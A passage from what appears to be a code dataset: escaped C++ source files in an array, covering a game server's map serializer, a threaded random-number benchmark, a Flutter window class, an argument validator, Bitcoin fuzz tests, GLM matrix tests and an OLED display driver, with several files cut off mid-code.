\" << (OTSYS_TIME() - start) / (1000.) << \" s\" << std::endl;\n}\n\nbool IOMapSerialize::saveHouseItems()\n{\n\tint64_t start = OTSYS_TIME();\n\tDatabase& db = Database::getInstance();\n\n\t//Start the transaction\n\tDBTransaction transaction;\n\tif (!transaction.begin()) {\n\t\treturn false;\n\t}\n\n\t//clear old tile data\n\tif (!db.executeQuery(\"DELETE FROM `tile_store`\")) {\n\t\treturn false;\n\t}\n\n\tDBInsert stmt(\"INSERT INTO `tile_store` (`house_id`, `data`) VALUES \");\n\n\tPropWriteStream stream;\n\tfor (const auto& it : g_game.map.houses.getHouses()) {\n\t\t//save house items\n\t\tHouse* house = it.second;\n\t\tfor (HouseTile* tile : house->getTiles()) {\n\t\t\tsaveTile(stream, tile);\n\n\t\t\tif (auto attributes = stream.getStream(); !attributes.empty()) {\n\t\t\t\tif (!stmt.addRow(fmt::format(\"{:d}, {:s}\", house->getId(), db.escapeString(attributes)))) {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tstream.clear();\n\t\t\t}\n\t\t}\n\t}\n\n\tif (!stmt.execute()) {\n\t\treturn false;\n\t}\n\n\t//End the transaction\n\tbool success = transaction.commit();\n\tstd::cout << \"> Saved house items in: \" <<\n\t          (OTSYS_TIME() - start) / (1000.) << \" s\" << std::endl;\n\treturn success;\n}\n\nbool IOMapSerialize::loadContainer(PropStream& propStream, Container* container)\n{\n\twhile (container->serializationCount > 0) {\n\t\tif (!loadItem(propStream, container)) {\n\t\t\tstd::cout << \"[Warning - IOMapSerialize::loadContainer] Unserialization error for container item: \" << container->getID() << std::endl;\n\t\t\treturn false;\n\t\t}\n\t\tcontainer->serializationCount--;\n\t}\n\n\tuint8_t endAttr;\n\tif (!propStream.read<uint8_t>(endAttr) || endAttr != 0) {\n\t\tstd::cout << \"[Warning - IOMapSerialize::loadContainer] Unserialization error for container item: \" << container->getID() << std::endl;\n\t\treturn false;\n\t}\n\treturn true;\n}\n\nbool IOMapSerialize::loadItem(PropStream& propStream, Cylinder* parent)\n{\n\tuint16_t id;\n\tif (!propStream.read<uint16_t>(id)) {\n\t\treturn false;\n\t}\n\n\tTile* tile = nullptr;\n\tif (parent->getParent() == nullptr) {\n\t\ttile = parent->getTile();\n\t}\n\n\tconst ItemType& iType = Item::items[id];\n\tif (iType.moveable || iType.forceSerialize || !tile) {\n\t\t//create a new item\n\t\tItem* item = Item::CreateItem(id);\n\t\tif (item) {\n\t\t\tif (item->unserializeAttr(propStream)) {\n\t\t\t\tContainer* container = item->getContainer();\n\t\t\t\tif (container && !loadContainer(propStream, container)) {\n\t\t\t\t\tdelete item;\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\n\t\t\t\tparent->internalAddThing(item);\n\t\t\t\titem->startDecaying();\n\t\t\t} else {\n\t\t\t\tstd::cout << \"WARNING: Unserialization error in IOMapSerialize::loadItem()\" << id << std::endl;\n\t\t\t\tdelete item;\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t} else {\n\t\t// Stationary items like doors/beds/blackboards/bookcases\n\t\tItem* item = nullptr;\n\t\tif (const TileItemVector* items = tile->getItemList()) {\n\t\t\tfor (Item* findItem : *items) {\n\t\t\t\tif (findItem->getID() == id) {\n\t\t\t\t\titem = findItem;\n\t\t\t\t\tbreak;\n\t\t\t\t} else if (iType.isDoor() && findItem->getDoor()) {\n\t\t\t\t\titem = findItem;\n\t\t\t\t\tbreak;\n\t\t\t\t} else if (iType.isBed() && findItem->getBed()) {\n\t\t\t\t\titem = findItem;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (item) {\n\t\t\tif (item->unserializeAttr(propStream)) {\n\t\t\t\tContainer* container = item->getContainer();\n\t\t\t\tif (container && !loadContainer(propStream, container)) {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\n\t\t\t\tg_game.transformItem(item, id);\n\t\t\t} else {\n\t\t\t\tstd::cout << \"WARNING: Unserialization error in IOMapSerialize::loadItem()\" << id << std::endl;\n\t\t\t}\n\t\t} else {\n\t\t\t//The map changed since the last save, just read the attributes\n\t\t\tstd::unique_ptr<Item> dummy(Item::CreateItem(id));\n\t\t\tif (dummy) {\n\t\t\t\tdummy->unserializeAttr(propStream);\n\t\t\t\tContainer* container = dummy->getContainer();\n\t\t\t\tif (container) {\n\t\t\t\t\tif (!loadContainer(propStream, container)) {\n\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t} else if (BedItem* bedItem = dynamic_cast<BedItem*>(dummy.get())) {\n\t\t\t\t\tuint32_t sleeperGUID = bedItem->getSleeper();\n\t\t\t\t\tif (sleeperGUID != 0) {\n\t\t\t\t\t\tg_game.removeBedSleeper(sleeperGUID);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn true;\n}\n\nvoid IOM",
    "#include <chrono> \n#include <iostream>\n#include <random>\n#include <string>\n#include <sstream>\n#include <thread>\n#include <vector>\n\n#include \"ArgHandler.hpp\"\n\n// Global random number generator\nstd::mt19937_64 generator; \n\n// Function declarations\nvoid generateRandomNumbers(unsigned long long);\nstd::chrono::system_clock::time_point spawnThreads(\n  unsigned long long, unsigned long long);\n\n// Main\nint main(int argc, char* argv[]) {\n\n  // Argument variables\n  unsigned long long threads, iterations;  \n\n  // Seed generator\n  generator.seed(std::random_device()());\n\n  // Parse arguments\n  int result = ArgHandler(argc, argv);\n\n  if(result == 0) return 1;\n\n  if(result == 1) {\n    try {\n      std::stringstream(argv[2]) >> iterations;\n    } catch(const std::exception& e) {\n      std::cout << \"Error parsing iterations\\n\";\n    }\n\n    try {  \n      std::stringstream(argv[3]) >> threads;\n    } catch(const std::exception& e) {\n      std::cout << \"Error parsing threads\\n\";\n    }\n  } else if(result == -1) {}\n\n  // Start timer\n  auto start = std::chrono::high_resolution_clock::now();\n\n  // Spawn threads\n  auto end = spawnThreads(threads, iterations);\n\n  // Print elapsed time\n  std::chrono::duration<double, std::milli> ms = end - start;\n  std::cout << std::endl << \"Time taken: \" << ms.count() << \"ms\\n\";\n\n  return 0;\n\n}\n\nstd::chrono::system_clock::time_point spawnThreads(unsigned long long threads, unsigned long long iterations) {\n\n  std::vector<std::thread> threadPool(threads);\n\n  for(unsigned long long i = 0; i < threads; i++) {\n    threadPool[i] = std::thread(generateRandomNumbers, iterations); \n  }\n\n  for(auto& thread : threadPool) {\n    thread.join();\n  }\n\n  return std::chrono::system_clock::now();\n\n}\n\nvoid generateRandomNumbers(unsigned long long iterations) {\n\n  for(unsigned long long i = 0; i < iterations; i++) {\n    std::cout << generator();\n  }\n\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/**\n * @file InputValidator.cpp\n *\n * @brief InputValidator class for command line arguments validation.\n *        Arguments must be int values, which represents coefficients\n *        of quadratic equations.\n *\n * @author Hovsep Papoyan\n * Contact: papoyanhovsep93@gmail.com\n * @Date 2024-03-28\n *\n */\n\n#include \"InputValidator.h\"\n\n#include <charconv>\n#include <iomanip>\n#include <iostream>\n#include <limits>\n#include <string_view>\n\nstd::optional<std::vector<int>> InputValidator::getValidatedInput(const int argc, const char* const argv[])\n{\n    if (argc < 4 || (argc - 1) % 3 != 0)\n    {\n        // Minimum 3 arguments are needed except the first one (program name).\n        // Provided arguments count must be multiple of 3.\n        std::cerr << \"Please provide enough arguments\\n\";\n        return std::nullopt;\n    }\n    std::vector<int> validatedInput;\n    validatedInput.reserve(static_cast<std::size_t>(argc) - 1);\n    for (const std::string_view arg : std::vector<std::string_view>(argv + 1, argv + argc))\n    {\n        int result;\n        const char* const last = arg.data() + arg.size();\n        auto [ptr, ec] = std::from_chars(arg.data(), last, result);\n\n        if (ec != std::errc() || ptr != last\n            || (result == 0 && arg.size() > 1) || (result != 0 && arg[0] == '0'))\n        {            \n            // reporting \"is not an int\" in case of diapason violation also. \n            std::cerr << std::quoted(arg) << \" is not an int [\"\n                << std::numeric_limits<int>::min() << ',' << std::numeric_limits<int>::max() << \"]\\n\";\n            return std::nullopt;\n        }\n        validatedInput.push_back(result);\n    }\n    return validatedInput;\n}\n",
    "#include <test/fuzz/FuzzedDataProvider.h>\n#include <test/fuzz/fuzz.h>\n#include <test/fuzz/util.h>\n#include <test/fuzz/util/mempool.h>\n#include <test/util/script.h>\n#include <test/util/setup_common.h>\n#include <test/util/txmempool.h>\n#include <test/util/mining.h>\n\n#include <node/mini_miner.h>\n#include <node/miner.h>\n#include <primitives/transaction.h>\n#include <random.h>\n#include <txmempool.h>\n\n#include <deque>\n#include <vector>\n\nnamespace {\n\nconst TestingSetup* g_setup;\nstd::deque<COutPoint> g_available_coins;\nvoid initialize_miner()\n{\n    static const auto testing_setup = MakeNoLogFileContext<const TestingSetup>();\n    g_setup = testing_setup.get();\n    for (uint32_t i = 0; i < uint32_t{100}; ++i) {\n        g_available_coins.emplace_back(Txid::FromUint256(uint256::ZERO), i);\n    }\n}\n\n// Test that the MiniMiner can run with various outpoints and feerates.\nFUZZ_TARGET(mini_miner, .init = initialize_miner)\n{\n    FuzzedDataProvider fuzzed_data_provider{buffer.data(), buffer.size()};\n    CTxMemPool pool{CTxMemPool::Options{}};\n    std::vector<COutPoint> outpoints;\n    std::deque<COutPoint> available_coins = g_available_coins;\n    LOCK2(::cs_main, pool.cs);\n    // Cluster size cannot exceed 500\n    LIMITED_WHILE(!available_coins.empty(), 500)\n    {\n        CMutableTransaction mtx = CMutableTransaction();\n        const size_t num_inputs = fuzzed_data_provider.ConsumeIntegralInRange<size_t>(1, available_coins.size());\n        const size_t num_outputs = fuzzed_data_provider.ConsumeIntegralInRange<size_t>(1, 50);\n        for (size_t n{0}; n < num_inputs; ++n) {\n            auto prevout = available_coins.front();\n            mtx.vin.emplace_back(prevout, CScript());\n            available_coins.pop_front();\n        }\n        for (uint32_t n{0}; n < num_outputs; ++n) {\n            mtx.vout.emplace_back(100, P2WSH_OP_TRUE);\n        }\n        CTransactionRef tx = MakeTransactionRef(mtx);\n        TestMemPoolEntryHelper entry;\n        const CAmount fee{ConsumeMoney(fuzzed_data_provider, /*max=*/MAX_MONEY/100000)};\n        assert(MoneyRange(fee));\n        pool.addUnchecked(entry.Fee(fee).FromTx(tx));\n\n        // All outputs are available to spend\n        for (uint32_t n{0}; n < num_outputs; ++n) {\n            if (fuzzed_data_provider.ConsumeBool()) {\n                available_coins.emplace_back(tx->GetHash(), n);\n            }\n        }\n\n        if (fuzzed_data_provider.ConsumeBool() && !tx->vout.empty()) {\n            // Add outpoint from this tx (may or not be spent by a later tx)\n            outpoints.emplace_back(tx->GetHash(),\n                                          (uint32_t)fuzzed_data_provider.ConsumeIntegralInRange<size_t>(0, tx->vout.size()));\n        } else {\n            // Add some random outpoint (will be interpreted as confirmed or not yet submitted\n            // to mempool).\n            auto outpoint = ConsumeDeserializable<COutPoint>(fuzzed_data_provider);\n            if (outpoint.has_value() && std::find(outpoints.begin(), outpoints.end(), *outpoint) == outpoints.end()) {\n                outpoints.push_back(*outpoint);\n            }\n        }\n\n    }\n\n    const CFeeRate target_feerate{CFeeRate{ConsumeMoney(fuzzed_data_provider, /*max=*/MAX_MONEY/1000)}};\n    std::optional<CAmount> total_bumpfee;\n    CAmount sum_fees = 0;\n    {\n        node::MiniMiner mini_miner{pool, outpoints};\n        assert(mini_miner.IsReadyToCalculate());\n        const auto bump_fees = mini_miner.CalculateBumpFees(target_feerate);\n        for (const auto& outpoint : outpoints) {\n            auto it = bump_fees.find(outpoint);\n            assert(it != bump_fees.end());\n            assert(it->second >= 0);\n            sum_fees += it->second;\n        }\n        assert(!mini_miner.IsReadyToCalculate());\n    }\n    {\n        node::MiniMiner mini_miner{pool, outpoints};\n        assert(mini_miner.IsReadyToCalculate());\n        total_bumpfee = mini_miner.CalculateTotalBumpFees(target_feerate);\n        assert(total_bumpfee.has_value());\n        assert(!mini_miner.IsReadyToCalculate());\n    }\n    // Overlapping ancestry across multiple outpoints can only reduce the total bump fee.\n    assert (sum_fees >= *total_bumpfee);\n}\n\n// Test that MiniMiner and BlockAssembler build the same block given the same transactions and constraints.\nFUZZ_TARGET(mini_miner_selection, .init = initialize_miner)\n{\n    FuzzedDataProvider fuzzed_data_provider{buffer.data(), buffer.size()};\n    CTxMemPool pool{CTxMemPool::Options{}};\n    // Make a copy to preserve determinism.\n    std::deque<COutPoint> available_coins = g_available_coins;\n    std::vector<CTransactionRef> transactions;\n\n    LOCK2(::cs_main, pool.cs);\n    LIMITED_WHILE(fuzzed_data_provider.ConsumeBool(), 100)\n    {\n        CMutableTransaction mtx = CMutableTransaction();\n        assert(!available_coins.empty());\n        const size_t num_inputs = std::min(size_t{2}, available_coins.size());\n        const size_t num_outputs = fuzzed_data_provider.ConsumeIntegralInRange<size_t>(2, 5);\n        for (size_t n{0};",
    "#include <glm/ext/vector_relational.hpp>\n#include <glm/gtc/constants.hpp>\n#include <glm/gtc/matrix_access.hpp>\n#include <glm/mat2x2.hpp>\n#include <glm/mat2x3.hpp>\n#include <glm/mat2x4.hpp>\n#include <glm/mat3x2.hpp>\n#include <glm/mat3x3.hpp>\n#include <glm/mat3x4.hpp>\n#include <glm/mat4x2.hpp>\n#include <glm/mat4x3.hpp>\n#include <glm/mat4x4.hpp>\n\nint test_mat2x2_row_set()\n{\n\tint Error = 0;\n\n\tglm::mat2x2 m(1);\n\n\tm = glm::row(m, 0, glm::vec2( 0,  1));\n\tm = glm::row(m, 1, glm::vec2( 4,  5));\n\n\tError += glm::all(glm::equal(glm::row(m, 0), glm::vec2( 0,  1), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 1), glm::vec2( 4,  5), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat2x2_col_set()\n{\n\tint Error = 0;\n\n\tglm::mat2x2 m(1);\n\n\tm = glm::column(m, 0, glm::vec2( 0,  1));\n\tm = glm::column(m, 1, glm::vec2( 4,  5));\n\n\tError += glm::all(glm::equal(glm::column(m, 0), glm::vec2( 0,  1), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::column(m, 1), glm::vec2( 4,  5), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat2x3_row_set()\n{\n\tint Error = 0;\n\n\tglm::mat2x3 m(1);\n\n\tm = glm::row(m, 0, glm::vec2( 0,  1));\n\tm = glm::row(m, 1, glm::vec2( 4,  5));\n\tm = glm::row(m, 2, glm::vec2( 8,  9));\n\n\tError += glm::all(glm::equal(glm::row(m, 0), glm::vec2( 0,  1), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 1), glm::vec2( 4,  5), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 2), glm::vec2( 8,  9), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat2x3_col_set()\n{\n\tint Error = 0;\n\n\tglm::mat2x3 m(1);\n\n\tm = glm::column(m, 0, glm::vec3( 0,  1,  2));\n\tm = glm::column(m, 1, glm::vec3( 4,  5,  6));\n\n\tError += glm::all(glm::equal(glm::column(m, 0), glm::vec3( 0,  1,  2), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::column(m, 1), glm::vec3( 4,  5,  6), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat2x4_row_set()\n{\n\tint Error = 0;\n\n\tglm::mat2x4 m(1);\n\n\tm = glm::row(m, 0, glm::vec2( 0,  1));\n\tm = glm::row(m, 1, glm::vec2( 4,  5));\n\tm = glm::row(m, 2, glm::vec2( 8,  9));\n\tm = glm::row(m, 3, glm::vec2(12, 13));\n\n\tError += glm::all(glm::equal(glm::row(m, 0), glm::vec2( 0,  1), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 1), glm::vec2( 4,  5), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 2), glm::vec2( 8,  9), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 3), glm::vec2(12, 13), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat2x4_col_set()\n{\n\tint Error = 0;\n\n\tglm::mat2x4 m(1);\n\n\tm = glm::column(m, 0, glm::vec4( 0,  1,  2, 3));\n\tm = glm::column(m, 1, glm::vec4( 4,  5,  6, 7));\n\n\tError += glm::all(glm::equal(glm::column(m, 0), glm::vec4( 0,  1,  2, 3), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::column(m, 1), glm::vec4( 4,  5,  6, 7), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat3x2_row_set()\n{\n\tint Error = 0;\n\n\tglm::mat3x2 m(1);\n\n\tm = glm::row(m, 0, glm::vec3( 0,  1,  2));\n\tm = glm::row(m, 1, glm::vec3( 4,  5,  6));\n\n\tError += glm::all(glm::equal(glm::row(m, 0), glm::vec3( 0,  1,  2), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 1), glm::vec3( 4,  5,  6), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat3x2_col_set()\n{\n\tint Error = 0;\n\n\tglm::mat3x2 m(1);\n\n\tm = glm::column(m, 0, glm::vec2( 0,  1));\n\tm = glm::column(m, 1, glm::vec2( 4,  5));\n\tm = glm::column(m, 2, glm::vec2( 8,  9));\n\n\tError += glm::all(glm::equal(glm::column(m, 0), glm::vec2( 0,  1), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::column(m, 1), glm::vec2( 4,  5), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::column(m, 2), glm::vec2( 8,  9), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat3x3_row_set()\n{\n\tint Error = 0;\n\n\tglm::mat3x3 m(1);\n\n\tm = glm::row(m, 0, glm::vec3( 0,  1,  2));\n\tm = glm::row(m, 1, glm::vec3( 4,  5,  6));\n\tm = glm::row(m, 2, glm::vec3( 8,  9, 10));\n\n\tError += glm::all(glm::equal(glm::row(m, 0), glm::vec3( 0,  1,  2), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 1), glm::vec3( 4,  5,  6), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::row(m, 2), glm::vec3( 8,  9, 10), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat3x3_col_set()\n{\n\tint Error = 0;\n\n\tglm::mat3x3 m(1);\n\n\tm = glm::column(m, 0, glm::vec3( 0,  1,  2));\n\tm = glm::column(m, 1, glm::vec3( 4,  5,  6));\n\tm = glm::column(m, 2, glm::vec3( 8,  9, 10));\n\n\tError += glm::all(glm::equal(glm::column(m, 0), glm::vec3( 0,  1,  2), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::column(m, 1), glm::vec3( 4,  5,  6), glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(glm::column(m, 2), glm::vec3( 8,  9, 10), glm::epsilon<float>())) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_mat3x4_row_set()\n{\n\tint Err",
    "#include \"i2c_oled.h\"\r\n#include \"font.h\"\r\n#include \"mbed.h\"\r\n#include \"genshin.h\"\r\n#include <cstdint>\r\n\r\nDigitalOut OLED_SCL(D3);\r\nDigitalOut OLED_SDA(D4);\r\n\r\nuint8_t buffer[144][8];\r\n\r\n/**\r\n * @brief  OLED\u6b21\u65b9\u51fd\u6570\r\n * @retval \u8fd4\u56de\u503c\u7b49\u4e8eX\u7684Y\u6b21\u65b9\r\n */\r\nuint32_t OLED_Pow(uint32_t X, uint32_t Y) {\r\n  uint32_t Result = 1;\r\n  while (Y--) {\r\n    Result *= X;\r\n  }\r\n  return Result;\r\n}\r\n\r\nvoid OLED_W_SCL(uint8_t x) { OLED_SCL = x; }\r\n\r\nvoid OLED_W_SDA(uint8_t x) { OLED_SDA = x; }\r\n\r\nvoid OLED_I2C_Init() {\r\n  OLED_W_SCL(1);\r\n  OLED_W_SDA(1);\r\n}\r\n\r\nvoid OLED_I2C_Start(void) {\r\n  OLED_W_SDA(1);\r\n  OLED_W_SCL(1);\r\n  OLED_W_SDA(0);\r\n  OLED_W_SCL(0);\r\n}\r\n\r\n/**\r\n * @brief  I2C\u505c\u6b62\r\n * @param  \u65e0\r\n * @retval \u65e0\r\n */\r\nvoid OLED_I2C_Stop(void) {\r\n  OLED_W_SDA(0);\r\n  OLED_W_SCL(1);\r\n  OLED_W_SDA(1);\r\n}\r\n\r\n/**\r\n * @brief  I2C\u53d1\u9001\u4e00\u4e2a\u5b57\u8282\r\n * @param  Byte \u8981\u53d1\u9001\u7684\u4e00\u4e2a\u5b57\u8282\r\n * @retval \u65e0\r\n */\r\nvoid OLED_I2C_SendByte(uint8_t Byte) {\r\n  uint8_t i;\r\n  for (i = 0; i < 8; i++) {\r\n    OLED_W_SDA(Byte & (0x80 >> i));\r\n    OLED_W_SCL(1);\r\n    OLED_W_SCL(0);\r\n  }\r\n  OLED_W_SCL(1); //\u989d\u5916\u7684\u4e00\u4e2a\u65f6\u949f\uff0c\u4e0d\u5904\u7406\u5e94\u7b54\u4fe1\u53f7\r\n  OLED_W_SCL(0);\r\n}\r\n\r\n/**\r\n * @brief  OLED\u5199\u547d\u4ee4\r\n * @param  Command \u8981\u5199\u5165\u7684\u547d\u4ee4\r\n * @retval \u65e0\r\n */\r\nvoid OLED_WriteCommand(uint8_t Command) {\r\n  OLED_I2C_Start();\r\n  OLED_I2C_SendByte(0x78); //\u4ece\u673a\u5730\u5740\r\n  OLED_I2C_SendByte(0x00); //\u5199\u547d\u4ee4\r\n  OLED_I2C_SendByte(Command);\r\n  OLED_I2C_Stop();\r\n}\r\n\r\n/**\r\n * @brief  OLED\u5199\u6570\u636e\r\n * @param  Data \u8981\u5199\u5165\u7684\u6570\u636e\r\n * @retval \u65e0\r\n */\r\nvoid OLED_WriteData(uint8_t Data) {\r\n  OLED_I2C_Start();\r\n  OLED_I2C_SendByte(0x78); //\u4ece\u673a\u5730\u5740\r\n  OLED_I2C_SendByte(0x40); //\u5199\u6570\u636e\r\n  OLED_I2C_SendByte(Data);\r\n  OLED_I2C_Stop();\r\n}\r\n\r\nvoid OLED_Genshin() {\r\n  OLED_ClearBuffer();\r\n  OLED_ShowPictureBuffered(0, 0, 128, 64, genshinImage, 0);\r\n  OLED_SendBuffer();\r\n}\r\n\r\n//\u6e05\u9664\u663e\u5b58\r\nvoid OLED_ClearBuffer(void) {\r\n  uint8_t i, n;\r\n  for (i = 0; i < 8; i++) {\r\n    for (n = 0; n < 128; n++) {\r\n      buffer[n][i] = 0; //\u6e05\u9664\u6240\u6709\u6570\u636e\r\n    }\r\n  }\r\n}\r\n\r\n//\u66f4\u65b0\u663e\u5b58\u5230OLED\r\nvoid OLED_SendBuffer(void) {\r\n  uint8_t i, n;\r\n  for (i = 0; i < 8; i++) {\r\n    OLED_WriteCommand(0xb0 + i); //\u8bbe\u7f6e\u884c\u8d77\u59cb\u5730\u5740\r\n    OLED_WriteCommand(0x00);     //\u8bbe\u7f6e\u4f4e\u5217\u8d77\u59cb\u5730\u5740\r\n    OLED_WriteCommand(0x10);     //\u8bbe\u7f6e\u9ad8\u5217\u8d77\u59cb\u5730\u5740\r\n    for (n = 0; n < 128; n++)\r\n      OLED_WriteData(buffer[n][i]);\r\n  }\r\n}\r\n\r\n//\u753b\u70b9\r\n// x:0~127\r\n// y:0~63\r\n// t:1 \u586b\u5145 0,\u6e05\u7a7a\r\nvoid OLED_DrawPointBuffered(uint8_t x, uint8_t y, uint8_t t) {\r\n  uint8_t i, m, n;\r\n  i = y / 8;\r\n  m = y % 8;\r\n  n = 1 << m;\r\n  if (t) {\r\n    buffer[x][i] |= n;\r\n  } else {\r\n    buffer[x][i] = ~buffer[x][i];\r\n    buffer[x][i] |= n;\r\n    buffer[x][i] = ~buffer[x][i];\r\n  }\r\n}\r\n\r\n//\u5728\u6307\u5b9a\u4f4d\u7f6e\u663e\u793a\u4e00\u4e2a\u5b57\u7b26,\u5305\u62ec\u90e8\u5206\u5b57\u7b26\r\n// x:0~127\r\n// y:0~63\r\n// size1:\u9009\u62e9\u5b57\u4f53 6x8/6x12/8x16/12x24\r\n// mode:0,\u53cd\u8272\u663e\u793a;1,\u6b63\u5e38\u663e\u793a\r\nvoid OLED_ShowCharBuffered(uint8_t x, uint8_t y, uint8_t chr, uint8_t size1,\r\n                           uint8_t mode) {\r\n  uint8_t i, m, temp, size2, chr1;\r\n  uint8_t x0 = x, y0 = y;\r\n  if (size1 == 8)\r\n    size2 = 6;\r\n  else\r\n    size2 = (size1 / 8 + ((size1 % 8) ? 1 : 0)) *\r\n            (size1 / 2); //\u5f97\u5230\u5b57\u4f53\u4e00\u4e2a\u5b57\u7b26\u5bf9\u5e94\u70b9\u9635\u96c6\u6240\u5360\u7684\u5b57\u8282\u6570\r\n  chr1 = chr - ' ';      //\u8ba1\u7b97\u504f\u79fb\u540e\u7684\u503c\r\n  for (i = 0; i < size2; i++) {\r\n    if (size1 == 8) { //\u8c03\u75280806\u5b57\u4f53\r\n      temp = asc2_0806[chr1][i];\r\n    } else if (size1 == 12) { //\u8c03\u75281206\u5b57\u4f53\r\n      temp = asc2_1206[chr1][i];\r\n    } else if (size1 == 16) { //\u8c03\u75281608\u5b57\u4f53\r\n      temp = asc2_1608[chr1][i];\r\n    } else if (size1 == 24) { //\u8c03\u75282412\u5b57\u4f53\r\n      temp = asc2_2412[chr1][i];\r\n    } else\r\n      return;\r\n    for (m = 0; m < 8; m++) {\r\n      if (temp & 0x01)\r\n        OLED_DrawPointBuffered(x, y, mode);\r\n      else\r\n        OLED_DrawPointBuffered(x, y, !mode);\r\n      temp >>= 1;\r\n      y++;\r\n    }\r\n    x++;\r\n    if ((size1 != 8) && ((x - x0) == size1 / 2)) {\r\n      x = x0;\r\n      y0 = y0 + 8;\r\n    }\r\n    y = y0;\r\n  }\r\n}\r\n\r\n//\u663e\u793a\u5b57\u7b26\u4e32\r\n// x,y:\u8d77\u70b9\u5750\u6807\r\n// size1:\u5b57\u4f53\u5927\u5c0f\r\n//*chr:\u5b57\u7b26\u4e32\u8d77\u59cb\u5730\u5740\r\n// mode:0,\u53cd\u8272\u663e\u793a;1,\u6b63\u5e38\u663e\u793a\r\nvoid OLED_ShowStringBuffered(uint8_t x, uint8_t y, char string[], uint8_t size1,\r\n                             uint8_t mode) {\r\n  uint8_t i=0;\r\n  while ((string[i] >= ' ') && (string[i] <= '~')) //\u5224\u65ad\u662f\u4e0d\u662f\u975e\u6cd5\u5b57\u7b26!\r\n  {\r\n    OLED_ShowCharBuffered(x, y, string[i], size1, mode);\r\n    if (size1 == 8)\r\n      x += 6;\r\n    else\r\n      x += size1 / 2;\r\n    i++;\r\n  }\r\n}\r\n\r\n//\u663e\u793a\u6570\u5b57\r\n// x,y :\u8d77\u70b9\u5750\u6807\r\n// num :\u8981\u663e\u793a\u7684\u6570\u5b57\r\n// len :\u6570\u5b57\u7684\u4f4d\u6570\r\n// size:\u5b57\u4f53\u5927\u5c0f\r\n// mode:0,\u53cd\u8272\u663e\u793a;1,\u6b63\u5e38\u663e\u793a\r\nvoid OLED_ShowNumBuffered(uint8_t x, uint8_t y, uint32_t num, uint8_t len,\r\n                          uint8_t size1, uint8_t mode) {\r\n  uint8_t t, temp, m = 0;\r\n  if (size1 == 8)\r\n    m = 2;\r\n  for (t = 0; t < len; t++) {\r\n    temp = (num / OLED_Pow(10, len - t - 1)) % 10;\r\n    if 